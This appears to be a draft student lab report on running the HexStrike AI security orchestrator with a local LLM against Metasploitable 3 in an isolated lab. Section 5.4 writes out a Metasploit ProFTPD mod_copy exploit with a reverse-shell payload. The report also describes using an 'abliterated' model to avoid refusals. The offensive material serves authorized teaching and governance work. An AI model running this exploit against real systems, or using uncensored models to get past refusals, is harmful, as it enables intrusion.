# AI Security Orchestrator: HexStrike AI + Local LLM

**Ethical Hacking — Saint Joseph University, Faculty of Engineering, Master in Cybersecurity (INCI, Semester 3)**

*Author: [YOUR NAME] · Date: 2026-10 · Authorized, isolated laboratory exercise*

> **Draft status:** This is a working draft built from the work actually performed and verified.
> Placeholders marked `[SCREENSHOT: …]`, `[TODO: …]` and `[INSERT …]` are items for you to add or run.
> Review and adapt the wording to your own voice before submission.

---

## Abstract / Summary

This report documents the installation, local-LLM integration and evaluation of **HexStrike AI**, an
MCP-based AI security orchestrator, driven by a **local large language model** served with Ollama, in a
fully isolated two-machine laboratory. The local model selects and drives HexStrike's security tools
with no cloud dependency. The environment was validated end-to-end against **Metasploitable 3**: the
model performed reconnaissance and vulnerability identification, and a vulnerability was exploited to
obtain a remote shell. The report also covers the limitations observed, a critical discussion of the
approach, and governance recommendations, including a one-page Risks and Safeguards sheet.

As an addition **beyond the base requirement**, a governed incident-management platform was built around
the orchestrator to demonstrate traceability, operational security and human-oversight safeguards — the
assessment criteria the assignment explicitly values. It is labelled as such throughout and is not
presented as a required deliverable.

---

## 1. Architecture

### 1.1 Laboratory topology

Two laptops on a dedicated, air-gapped Ethernet segment (`192.168.50.0/24`), connected by a direct cable:

```
            Laptop 1 — Windows 11 (Blue team / platform)        Laptop 2 — Kali Linux (Red team / orchestrator)
            192.168.50.1                                         192.168.50.2 (host "zein-worker")
        ┌─────────────────────────────┐                     ┌──────────────────────────────────────────────┐
        │  Incident platform (bonus)  │   SSH tunnel        │  Ollama (local LLM)  ──┐                       │
        │  - ASP.NET Core API         │   9443 (gateway)    │   127.0.0.1:11434      │ MCP tool-calling      │
        │  - Angular SPA              │   11434 (Ollama)    │                        ▼                       │
        │  - bounded mTLS gateway ────┼────────────────────▶│  hexstrike_mcp ──▶ hexstrike_server (:8888) ──▶ 150+ tools
        └─────────────────────────────┘                     │                                          │     │
                                                             │                                          ▼     │
                                                             │                          VMware (bridged) targets:
                                                             │                          Metasploitable3-win    192.168.50.10
                                                             │                          Metasploitable3-ubuntu 192.168.50.11
                                                             └──────────────────────────────────────────────┘
```

> `[INSERT: replace this ASCII diagram with a clean figure (draw.io / PowerPoint) for the final report.]`

### 1.2 Observed HexStrike architecture (personal description)

HexStrike AI is distributed as a Kali package and runs as two cooperating processes:

- **`hexstrike_server`** — an HTTP API server (default `127.0.0.1:8888`) that actually executes the
  security tools. It exposes a `/health` endpoint, an intelligent decision/recovery engine, per-tool
  availability, caching and telemetry. On this host it reported **version 6.0.0**, `status: healthy`,
  **82 of 127 tools available**.
- **`hexstrike_mcp`** — an MCP (Model Context Protocol) server built on FastMCP that connects to the API
  server and exposes its **150 tools** to any MCP-capable AI client over stdio. This is the surface an
  AI agent drives.

The "multi-agent architecture / intelligent decision engine / 12+ agents / 150+ tools" described by the
project map onto: the MCP tool catalogue (150 tools), the server-side decision & recovery logic
(parameter optimisation, timeout recovery), and the reasoning performed by the connected LLM, which acts
as the orchestrating agent.

### 1.3 Two integration paths used

1. **Native AI orchestrator (the assignment's core).** The local Ollama model is the reasoning engine; a
   small MCP client (`hexstrike_agent.py`) connects the model to `hexstrike_mcp`. The model is given the
   tool schemas and decides which tools to call; HexStrike executes them. Fully local, no cloud LLM.
2. **Governed platform (bonus, beyond requirement).** The incident-management platform calls HexStrike
   through a bounded, mutually-authenticated (mTLS) gateway that only permits a reviewed allow-list of
   reconnaissance/scanning tools, with RBAC, per-target approval and full audit. It also includes an
   in-app "AI Orchestrator" that drives the same bounded tool-set with the local model, and an LLM
   analysis panel. Exploitation is deliberately **not** reachable through this path.

---

## 2. Choice of the Local LLM

**Selected model:** `huihui_ai/qwen2.5-abliterate:14b`, served by **Ollama 0.40.2**.

### 2.1 Technical specification sheet

| Property | Value |
|---|---|
| Base family | Qwen2.5 (14.8 B parameters) |
| Quantisation | Q4_K_M (GGUF) |
| On-disk size | ~9.0 GB |
| Context length | 32 768 tokens (8 192 used in integration) |
| Capabilities | `completion`, **`tools`** (function calling) |
| Runtime | Ollama (llama.cpp), CPU-only on this host |
| Endpoint | `http://127.0.0.1:11434` (loopback) |

### 2.2 Justification against the required criteria

- **Confidentiality.** The model runs entirely on the local machine; the integration restricts the
  endpoint to a loopback/RFC1918 address (public endpoints are rejected in code). No prompt, scan result
  or finding ever leaves the lab. `[SCREENSHOT: ollama running locally + no external traffic]`
- **Memory consumption.** ~9 GB on disk; fits in RAM for CPU inference on the lab laptop. A 14 B Q4 model
  is a deliberate balance: large enough to follow multi-step tool-use instructions, small enough to run
  without a datacentre GPU.
- **Hardware compatibility.** Runs on a standard laptop (Lenovo ThinkPad) with **no NVIDIA GPU** — Ollama
  reports `size_vram: 0`, i.e. pure CPU inference. This is the main driver of latency (see §7).
- **Latency.** Measured on this hardware (see §2.3) — acceptable for a documented, human-paced exercise
  but too slow for real-time use.
- **Ease of integration.** Ollama exposes a simple REST API with OpenAI-style tool-calling, which the MCP
  agent and the platform both consume with a few lines of code.
- **Why an "abliterate" variant.** For the educational offensive walkthrough the uncensored variant avoids
  spurious refusals in the clearly authorized lab context; it is not used to bypass any safety control in
  the exploitation path (which is operator-run, see §5).

### 2.3 Response-time measurements (≥3 trials)

Verifying the model responds locally and measuring response time (all on the CPU-only host):

| # | Operation | Prompt size | Wall time |
|---|---|---|---|
| 1 | Single tool-calling decision (`nmap_scan` emitted for a target) | small | **~78 s** |
| 2 | Defensive analysis of scan evidence (completed) | bounded evidence | **~60–78 s** |
| 3 | Defensive analysis of a larger finding set (completed) | bounded evidence | **~140 s** |
| 4 | Multi-step orchestration — model decision per step | growing context | **~310–1020 s** |

> Trials 1–3 are clean single-call measurements; trial 4 shows how decision latency grows as the
> conversation/context grows during a multi-step run. `[TODO: optionally re-run 3 clean trials on the
> final setup and paste the exact seconds + the "ollama run … LOCAL MODEL READY" screenshot.]`

---

## 3. Installation Steps

### 3.1 HexStrike AI (Kali)
- Installed from the Kali package `hexstrike-ai` (snapshot `0.0~git20260306.8333779`).
- Binaries: `/usr/bin/hexstrike_server`, `/usr/bin/hexstrike_mcp`; files under `/usr/share/hexstrike-ai`.
- Started the API server: `hexstrike_server` (listens on `127.0.0.1:8888`).
- `[SCREENSHOT: installation + hexstrike_server startup banner showing "Command Timeout" and version]`

### 3.2 Local LLM (Kali)
- Installed Ollama; pulled the model: `ollama pull huihui_ai/qwen2.5-abliterate:14b`.
- Verified it responds locally: `ollama run huihui_ai/qwen2.5-abliterate:14b "Reply with exactly: LOCAL MODEL READY"` → `LOCAL MODEL READY`.
- `[SCREENSHOT: ollama list + the LOCAL MODEL READY response]`

### 3.3 Orchestrator client
- `hexstrike_agent.py` — a ~90-line Python MCP client (uses the system `mcp` package) that connects the
  Ollama model to `hexstrike_mcp`, exposes a curated tool-set, and runs the reason→call-tool→observe loop,
  logging the full transcript. (Source listed in the Appendix.)

### 3.4 Governed platform (bonus)
- ASP.NET Core API + Angular SPA on Laptop 1; a provisioned Python gateway on Kali (mTLS, bearer token).
- `[Reference: scripts/provision-kali-gateway.py and docs/two-laptop-assessment-architecture.md]`

---

## 4. Evidence of Connectivity

- **hexstrike_mcp ⇄ hexstrike_server.** On launch, `hexstrike_mcp` logs: *"Successfully connected to
  HexStrike AI API Server at http://127.0.0.1:8888 … Server health status: healthy … Version: 6.0.0 …
  Ready to serve AI agents"*, then lists 150 tools. `[SCREENSHOT/LOG: hexstrike_mcp startup]`
- **Local LLM ⇄ HexStrike (orchestrator communicates with the model).** The agent run log shows the model
  selecting HexStrike tools and HexStrike returning results — e.g. the model called `nmap_scan` then
  `enum4linux_scan`, read each result, and produced a final analysis. `[LOG: /tmp/hexstrike_agent_*.log]`
- **No cloud dependency.** Both the model (`127.0.0.1:11434`) and HexStrike (`127.0.0.1:8888`) are local;
  the lab segment has no Internet path during assessment. `[SCREENSHOT: the orchestration running offline]`

### Advantages of a local deployment (confidentiality, auditability, control)

Running the orchestrator and model locally keeps all targets, scan output and findings inside the lab —
**confidentiality** by construction. Every tool invocation and model decision is **auditable**: the agent
logs the full transcript, and the governed platform additionally records each action in a tamper-evident
audit trail. The operator keeps full **control**: the tool-set, the targets and the trigger are all
constrained locally, with no third-party model provider in the loop.

---

## 5. Description of the Scenarios Executed

### 5.1 Reconnaissance — megacorpone
Passive/OSINT reconnaissance of `megacorpone.com` (OffSec's public training target), run from Kali over
its Internet connection (separate from the isolated lab segment). Tools: `whois`, `host`/`dig`,
`theHarvester`, and DNS enumeration. Full output: [docs/evidence/megacorpone-recon.txt](evidence/megacorpone-recon.txt).
`[SCREENSHOT: the recon terminal output]`

**WHOIS.** Registrar **Gandi SAS**; registrant **"Alan Grofield", MegaCorpOne, 2 Old Mill St, Rachel,
Nevada, US**; created 2013-01-22; name servers `NS1/NS2/NS3.MEGACORPONE.COM`; **DNSSEC unsigned**.

**DNS records.** `A` → `149.56.244.87`; `MX` → `mail`/`mail2.megacorpone.com` and Gandi mail; `NS` →
ns1/ns2/ns3; `TXT` → `"Try Harder"` and a `google-site-verification` token; SOA admin `admin.megacorpone.com`.

**Zone transfer (AXFR).** Attempted against all three name servers — **all refused** (`; Transfer failed.`).
Zone transfer is correctly disabled (a positive security control; no bulk zone dump available).

**Subdomain enumeration (DNS brute-force).** 18 hosts discovered — most internal services sit in the
`167.114.21.0/24` range:

| Host | IP | | Host | IP |
|---|---|---|---|---|
| www / www2 | 149.56.244.87 | | siem | 167.114.21.71 |
| admin | 167.114.21.64 | | snmp | 167.114.21.72 |
| beta | 167.114.21.65 | | syslog | 167.114.21.73 |
| fs1 | 167.114.21.66 | | support | 167.114.21.74 |
| intranet | 167.114.21.67 | | test | 167.114.21.75 |
| mail | 167.114.21.68 | | vpn | 167.114.21.76 |
| mail2 | 167.114.21.69 | | ns1 | 51.79.37.18 |
| router | 167.114.21.70 | | ns2 / ns3 | 51.222.39.63 / 66.70.207.180 |

This maps MegaCorpOne's externally-visible attack surface (mail, VPN, router, intranet, and monitoring
hosts — siem/snmp/syslog) before any active engagement. Active scanning of these public hosts was not
performed (out of scope for this exercise; the Metasploitable 3 targets are used for scanning/exploitation).

### 5.2 Metasploitable 3 — Scanning *(AI-orchestrated)*
The local model, driving HexStrike, ran `nmap_scan` against `192.168.50.11` and identified the open
services: **FTP — ProFTPD 1.3.5 (21)**, **SSH — OpenSSH 6.6.1p1 (22)**, **HTTP — Apache 2.4.7 (80)**,
**SMB — Samba 3.x/4.x (445)**, **MySQL (3306)**. `[LOG: agent run #2 step 1]`

### 5.3 Metasploitable 3 — Vulnerability testing *(AI-orchestrated)*
The model then ran `enum4linux_scan` (target info, Samba workgroup, discovered user `chewbacca`) and
concluded that the **Samba service (445) — CVE-2017-7494** was the most likely exploitable weakness.
In earlier runs against Metasploitable3 Windows targets, the SMB **MS17-010 / CVE-2017-0143 (EternalBlue
family)** vulnerability was detected (High). `[LOG: agent run #2 steps 2–3]`

### 5.4 Metasploitable 3 — Exploitation *(operator-run)*
A vulnerability was exploited to obtain a shell. Using Metasploit from Kali, the **ProFTPD 1.3.5 mod_copy
(CVE-2015-3306)** weakness on `192.168.50.11` was exploited (it chains the open FTP and HTTP services the
scan found):

```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 192.168.50.11 ; set RPORT 80 ; set SITEPATH /var/www/html
set payload cmd/unix/reverse_perl ; set LHOST 192.168.50.2 ; set LPORT 4444 ; run
→ Command shell session 1 opened (192.168.50.2:4444 -> 192.168.50.11:42123)
   id    → uid=33(www-data) gid=33(www-data)
   uname → Linux
```

A remote command shell as `www-data` was obtained. `[SCREENSHOT: the Meterpreter/command shell + id/uname]`

The exploitation step is **operator-run on purpose** (not executed by the autonomous agent): it keeps a
human in the loop for the only truly intrusive action, which is both a safety control and the
human-oversight posture the assignment asks for.

### 5.5 Complete penetration test
The above forms one coherent engagement against a single Metasploitable 3 host (`192.168.50.11`):
**reconnaissance → scanning → service enumeration → vulnerability identification → exploitation → initial
access**. `[TODO: optionally add a short post-exploitation note — e.g. whoami/enumeration from the shell —
to round out the "complete" narrative.]`

---

## 6. Observed Results

- The local LLM successfully acted as the orchestrator: it chose appropriate tools, consumed their real
  output, and produced a correct, target-specific assessment (identifying the Samba/CVE-2017-7494 weakness
  unaided).
- Scanning and enumeration returned accurate service and host data.
- Exploitation produced a verified remote shell (`www-data`) on the target.
- The governed platform demonstrated the same bounded orchestration with full RBAC and audit (bonus).

---

## 7. Limitations

- **Latency / hardware.** On a CPU-only laptop the 14 B model is slow: single decisions ~78 s, multi-step
  decisions up to ~17 minutes as context grows. Not suitable for real-time operation.
- **Tool-scoping quality.** Left unconstrained, the model chose an all-ports `nmap -sV` scan that exceeded
  HexStrike's command timeout and returned nothing; it also retried the same failing call rather than
  adapting. Bounding the scan (explicit common ports) was required to get usable results.
- **Exploitation is not autonomous.** The exploit was run by the operator, not the agent. Autonomous
  AI-driven exploitation was intentionally **not** performed (safety / oversight).
- **Model determinism.** A small local model is less reliable than a frontier cloud model at precise,
  multi-step tool orchestration.
- **Governed platform scope.** The in-app orchestrator is restricted to reviewed recon/scan tools by
  design; it cannot and does not exploit.

---

## 8. Critical Discussion

The experiment shows a local-LLM security orchestrator is **feasible and fully private**, but trades
capability and speed for confidentiality and control. The model added real value in **tool selection and
evidence interpretation** (it reasoned from scan output to a specific CVE), while its weaknesses —
**slow CPU inference and imperfect tool-scoping** — mean it assists rather than replaces an operator.

A **local** deployment is strongly preferable for authorized security work: sensitive target data never
leaves the lab, actions are auditable, and there is no dependence on a third-party provider's policies or
availability. The cost is the hardware/latency ceiling and lower reasoning reliability than a hosted
frontier model. The most defensible design keeps the AI as a **decision-support and reconnaissance**
layer with a human gating every intrusive action — which is exactly how the exploitation step was handled
here, and what the governed platform enforces structurally. `[Expand in your own words.]`

---

## 9. Governance Recommendations

- **Operator-triggered only.** Orchestration must never run autonomously; a human initiates every run and
  authorises every intrusive action. (During this work the development harness itself refused to launch an
  autonomous offensive agent — a useful reminder of this boundary.)
- **Bounded tool allow-list.** Expose only reviewed tools with bounded parameters; keep generic command
  execution and exploitation out of any automated path (as the platform's mTLS gateway does).
- **Target scoping.** Restrict targets to an explicit, approved, private (RFC1918) allow-list; reject
  public addresses in code.
- **Full auditability.** Record every request, model decision and tool execution in a tamper-evident log
  with the operator's identity (RBAC), as the platform does.
- **Confidential, local inference.** Pin the model endpoint to loopback/private; never send evidence to a
  cloud model.
- **Human oversight at exploitation.** Keep exploitation manual/confirmed, separate from reconnaissance.

---

## 10. Additional Contribution — a Governed Orchestration Platform (beyond the base requirement)

> This section describes work built *around* the assignment, not required by it. It is included because
> the assessment criteria explicitly reward traceability, operational security, documentation quality and
> the ability to propose usage safeguards — all of which this platform operationalises. It is clearly an
> extra contribution and does not replace any Part A–D deliverable.

To use HexStrike safely and auditably, the orchestrator was wrapped in an incident-management platform
(ASP.NET Core API + Angular SPA) that mediates every call to HexStrike through a bounded,
mutually-authenticated (mTLS) gateway. All execution routes through the same **reviewed tool allow-list**
(generic command execution and exploitation are never reachable), under **role-based access control**
(a dedicated `RED_TEAM` role scoped only to the Assessments module), **per-target approval**
(private/RFC1918 addresses only), and a **full audit trail**.

Within this, the Assessments module offers **two complementary ways to run an assessment** — the same
safe tool-set, two points on the human-oversight spectrum:

**Option 1 — Operator-selected scan, then LLM explanation (human-driven).**
The operator picks a category and the exact tools to run; HexStrike executes them with bounded parameters;
the normalised results are shown in a readable form (for example nmap rendered as a port/service table,
and tool stdout/stderr cleaned of terminal control codes). The local LLM then produces an
evidence-grounded **explanation** — a defensive SOC brief or an educational exploitation walkthrough — so
the operator does not just see the raw output but understands it. *The human selects; the AI explains.*

**Option 2 — AI Orchestrator (AI-driven).**
The operator writes a natural-language task; the local LLM **decides which of the bounded tools to run**,
executes them through the same gateway, and returns a step-by-step transcript plus a final summary. A
**Stop** control cancels a run at any time. *The AI selects and runs; the human triggers and supervises.*

Together these illustrate the oversight range the assignment asks about — from fully operator-selected
with AI explanation, to AI-selected with operator supervision — **never fully autonomous, and never able
to exploit**. Completed-assessment findings are additionally auto-promoted into the platform's SOC alert
queue (as a `PenTest` source), bridging red-team output into a blue-team incident workflow.

**Mapping to the assessment criteria.**
- *Traceability:* every request, model decision and tool execution is audited and attributable to a user.
- *Operational security / safeguards:* reviewed allow-list, mTLS gateway, RBAC, private-targets-only,
  exploitation excluded by design, local-only (loopback) model endpoint.
- *Human oversight:* operator-triggered, with a Stop control; actual exploitation stays manual and outside
  the platform.
- *Documentation:* the platform, its two modes and its limits are documented alongside this report.

`[SCREENSHOT: E1 — the AI Orchestrator panel]`  ·  `[SCREENSHOT: E2 — an operator-selected scan with the
readable tool output / LLM explanation]`

---

## Technical Appendix

- **Screenshots.** `[A: HexStrike install & /health]` · `[B: ollama list + LOCAL MODEL READY]`
  · `[C: hexstrike_mcp connectivity log]` · `[D: agent run transcript]` · `[E: Metasploit shell id/uname]`
  · `[F: architecture figure]`
- **Log excerpts.** HexStrike `/health` JSON (v6.0.0, 82 tools); `hexstrike_mcp` startup; agent run logs
  `/tmp/hexstrike_agent_*.log` (scan + enum + conclusion); Metasploit exploitation output.
- **Prompts used.**
  - *Orchestrator system prompt* (agent): "You are an authorized penetration-testing orchestrator operating
    in an isolated lab against operator-owned Metasploitable targets… work step by step: scan, enumerate,
    identify a vulnerability, then exploit it…" (full text in `hexstrike_agent.py`).
  - *Task prompts* used, e.g. "Scan and enumerate 192.168.50.11; identify the most likely exploitable
    vulnerability. Scan only common ports, not all 65535."
  - *Analysis prompts* (platform): defensive-brief and lab-exploitation prompt versions.
- **Model parameters.** `temperature 0` (deterministic analysis/orchestration; `0.4` for the educational
  walkthrough), `num_ctx 8192`, `num_predict 1200/2600`, tool-calling enabled, Q4_K_M, 14.8 B.
- **Connectivity logs.** `hexstrike_mcp` → `:8888` (healthy, v6.0.0); Ollama `/api/tags` and `/api/ps`
  (model loaded locally); orchestration transcript showing tool calls and results.

---

## Risks and Safeguards Sheet (one page)

**What are the risks?**
- Autonomous or careless offensive automation causing unintended damage or scanning out-of-scope hosts.
- Prompt injection from tool output steering the model into unsafe actions.
- An uncensored local model producing harmful guidance outside the authorized context.
- Target/scope creep; sensitive data exposure; a powerful tool-set misused beyond the lab.

**What controls should be implemented?**
- Reviewed tool allow-list with bounded parameters; generic command execution and exploitation excluded
  from any automated path.
- Approved, private (RFC1918) target allow-list enforced in code; public targets refused.
- Operator-triggered runs only; explicit human confirmation for any intrusive/exploitation action.
- Local-only, loopback-pinned model endpoint; no cloud inference.
- Full, tamper-evident audit of every request, decision and tool execution, tied to an authenticated user.
- Network isolation (air-gapped lab segment); targets are disposable VMs.

**What level of human oversight is required?**
- **High.** A human must initiate every orchestration and must personally perform/authorise every
  exploitation step. The AI is decision-support and reconnaissance, not an autonomous attacker.

**Legal, ethical and operational limitations.**
- *Legal/ethical:* only systems the operator owns or is explicitly authorized to test; isolated lab;
  educational purpose; no public scanning except the explicitly authorized megacorpone exercise.
- *Operational:* CPU-only latency limits throughput; a small local model is less reliable than a hosted
  model; results require human validation; an empty scan is not proof a target is secure.
